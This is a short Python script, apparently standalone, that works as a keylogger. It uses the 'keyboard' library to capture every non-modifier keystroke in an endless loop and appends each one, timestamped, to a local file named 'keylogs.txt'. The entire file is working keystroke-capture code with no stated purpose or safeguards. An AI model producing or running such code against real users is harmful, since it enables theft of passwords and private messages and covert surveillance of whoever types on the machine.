import sys
import time
from datetime import datetime
import keyboard

def log_keys():
    with open("keylogs.txt", "a") as f:
        while True:
            try:
                event = keyboard.read_event()
                if event.name not in keyboard.all_modifiers:
                    f.write(str(datetime.now()) + ": " + str(event.name) + "\n")
                    print(f"Key {event.name} logged at {datetime.now()}")
            except Exception as e:
                print("Error occurred:", e, file=sys.stderr)
                break

if __name__ == "__main__":
    log_keys()